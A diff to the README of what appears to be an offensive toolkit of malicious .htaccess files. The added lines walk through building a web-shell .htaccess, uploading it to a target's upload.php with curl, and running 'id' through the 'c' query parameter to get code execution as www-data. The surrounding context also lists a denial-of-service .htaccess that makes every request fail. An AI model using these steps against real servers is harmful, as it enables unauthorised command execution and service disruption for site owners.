@@ -6,6 +6,22 @@ named .htaccess, check the file to see if it needs editing before you upload it.
 Web shells executes commands from the query parameter c, unless the file states
 otherwise.
 
+To prepare run `./prepare.sh file` which will generate the .htaccess file
+to be uploaded. Example:
+```
+$ ./prepare.sh shell/mod_php.shell.htaccess
+┬ ┬┌┬┐┌─┐┬ ┬┌─┐┬  ┬  ┌─┐
+├─┤ │ └─┐├─┤├┤ │  │  └─┐
+┴ ┴ ┴ └─┘┴ ┴└─┘┴─┘┴─┘└─┘
+ justanotherhacker.com
+
+.htaccess file is ready
+$ curl -F 'file=@.htaccess' -k https://target/upload.php
+$ curl -k https://target/uploads/.htaccess?c=id
+...
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
 == DOS/       # Denial of service attacks
 - apache.dos.htaccess
   Makes all requests return a 500 internal server error
